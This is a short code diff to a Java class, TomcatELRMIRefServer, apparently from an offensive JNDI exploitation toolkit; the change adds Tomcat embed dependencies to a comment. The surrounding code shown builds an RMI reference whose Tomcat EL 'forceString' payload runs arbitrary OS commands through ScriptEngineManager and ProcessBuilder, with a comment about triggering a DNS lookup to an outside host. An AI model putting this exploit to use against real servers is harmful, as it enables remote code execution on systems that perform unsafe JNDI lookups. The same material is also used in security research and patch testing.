@@ -49,6 +49,18 @@ import sun.rmi.transport.TransportConstants;
  *             <artifactId>tomcat-jasper-el</artifactId>
  *         </dependency>
  *
+ *         or
+ *
+ *         <dependency>
+ *              <groupId>org.apache.tomcat.embed</groupId>
+ *              <artifactId>tomcat-embed-core</artifactId>
+ *         </dependency>
+ *
+ *         <dependency>
+ *              <groupId>org.apache.tomcat.embed</groupId>
+ *              <artifactId>tomcat-embed-el</artifactId>
+ *         </dependency>
+ *
  * @author threedr3am
  *
  */
@@ -127,7 +139,6 @@ public class TomcatELRMIRefServer implements Runnable {
             resourceRef.add(new StringRefAddr("forceString", "x=eval"));
             //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
             resourceRef.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](" + stringBuilder.toString() + ").start()\")"));
-
             ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
 
             System.err.println("* Opening JRMP listener on " + port);
